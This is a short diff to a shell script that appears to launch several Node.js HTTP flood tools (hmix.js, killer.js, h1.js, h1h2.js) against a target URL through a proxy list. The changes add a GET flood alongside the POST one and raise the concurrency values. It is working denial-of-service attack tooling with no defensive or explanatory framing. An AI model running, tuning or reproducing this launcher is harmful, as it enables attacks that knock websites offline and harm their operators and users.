@@ -15,9 +15,11 @@ node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false 
 
 node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 1 --close --randpath --parsed --reset &
 
-node h1.js POST "$URL" live.txt "$TIME" 999 24 randomstring="true" &
+node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
+node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 
-node h1h2.js "$URL" "$TIME" 5 999 mix live.txt &
+
+node h1h2.js "$URL" "$TIME" 10 999 mix live.txt &
 
 
 wait
